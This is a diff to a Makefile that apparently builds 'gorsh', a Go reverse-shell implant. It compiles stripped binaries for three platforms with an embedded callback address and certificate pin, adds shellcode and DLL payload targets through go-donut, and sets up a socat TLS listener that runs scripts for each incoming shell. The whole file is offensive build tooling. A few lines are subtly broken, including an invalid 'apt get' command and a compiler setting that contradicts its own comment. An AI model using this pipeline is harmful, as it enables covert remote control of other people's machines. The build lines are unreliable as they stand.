@@ -5,10 +5,10 @@ SRV_KEY = certs/server.key
 SRV_PEM = certs/server.pem
 PKEY = internal/sshocks/conf/id_ed25519
 
-BUILD=go build -trimpath
+BUILD = go build -trimpath
 
-PLATFORMS=linux windows darwin
-target=$(word 1, $@)
+PLATFORMS = linux windows darwin
+target = $(word 1, $@)
 
 LHOST ?= 127.0.0.1
 LPORT ?= 8443
@@ -16,14 +16,18 @@ LPORT ?= 8443
 FINGERPRINT = $(shell openssl x509 -fingerprint -sha256 -noout -in ${SRV_PEM} | cut -d '=' -f2)
 LDFLAGS = "-s -w -X main.connectString=${LHOST}:${LPORT} -X main.fingerPrint=${FINGERPRINT}"
 
+# Only set mingw on Linux
 ifeq ($(OS),Windows_NT)
 	CC=$(shell go env CC)
 else
+	ifeq ($(OS),Darwin)
+		CC=$(shell go env CC)
+	endif
 	CC=x86_64-w64-mingw32-gcc
 endif
 
-GARBLE=${GOPATH}/bin/garble
-GODONUT=${GOPATH}/bin/go-donut
+GODONUT = ${GOPATH}/bin/go-donut
+SOCAT = /usr/bin/socat
 
 # zStd is a highly efficient compression library that requires CGO compilation.
 # If you'd like to turn this feature on and have experience cross-compiling 
@@ -34,24 +38,24 @@ GODONUT=${GOPATH}/bin/go-donut
 # ZSTD.linux = -tags zstd
 
 .PHONY: all
-all: $(PLATFORMS) server 
+all: $(PLATFORMS) server shellcode dll
 
 .PHONY: $(PLATFORMS)
-${PLATFORMS}: $(GARBLE) $(PKEY) $(SRV_KEY)
+${PLATFORMS}: $(PKEY) $(SRV_KEY)
 	${ENV.${target}} \
 	GOOS=${target} ${BUILD} \
-			-buildmode pie \
-			-ldflags ${LDFLAGS} \
-			${ZSTD.${target}} \
-			-o ${OUT}/${APP}.${target} \
-			cmd/gorsh/main.go
+		-buildmode pie \
+		-ldflags ${LDFLAGS} \
+		${ZSTD.${target}} \
+		-o ${OUT}/${APP}.${target} \
+		cmd/gorsh/main.go
 
 .PHONY: listen listen-socat
-listen listen-socat: $(SRV_KEY)
-	KEY=${SRV_KEY} \
-			PEM=${SRV_PEM} \
-			LISTEN=scripts/${target}.sh \
-			scripts/start.sh
+listen listen-socat: $(SRV_KEY) $(SOCAT)
+	@test -n "$(PORT)" || (echo "PORT not defined"; exit 1)
+	${SOCAT} -d \
+		OPENSSL-LISTEN:${PORT},fork,key=${SRV_KEY},cert=${SRV_PEM},reuseaddr,verify=0 \
+		EXEC:scripts/${target}.sh
 
 .PHONY: server
 server:
@@ -92,6 +96,9 @@ scripts:
 
 $(GODONUT):
 	go get github.com/Binject/go-donut
+
+$(SOCAT):
+	sudo apt get install socat
 
 $(PKEY):
 	ssh-keygen -t ed25519 -f ${target} -N ''
